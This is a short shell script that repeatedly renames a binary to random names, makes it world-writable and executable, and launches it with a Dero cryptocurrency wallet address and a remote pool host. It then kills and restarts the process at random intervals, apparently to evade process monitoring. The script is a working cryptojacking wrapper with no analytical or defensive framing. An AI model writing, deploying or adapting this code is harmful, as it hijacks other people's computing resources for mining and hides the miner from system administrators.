#!/bin/sh

# Function to generate a random 9-digit alphanumeric name
generate_random_name() {
  new_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
}

# Store the original name of the main file
original_name="main"

while true; do
  generate_random_name
  delay=$((10 + RANDOM % 51))
  echo "Delay: $delay seconds"

  mv "$original_name" "$new_name"
  chmod 777 "$new_name"
  ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1 &
  pid=$!
  echo "Restarted with PID: $pid $new_name"

  sleep "$delay"
  echo "$new_name"

  if [ -n "$pid" ] && kill -0 "$pid" > /dev/null 2>&1; then
    echo "Stopping process with PID: $pid $new_name"
    kill -9 "$pid"
    mv "$new_name" "$original_name"
    echo "Process stopped $pid $new_name now is $original_name again."
  else
    echo "Process with PID $pid $new_name not found. Skipping process stop."
  fi
done



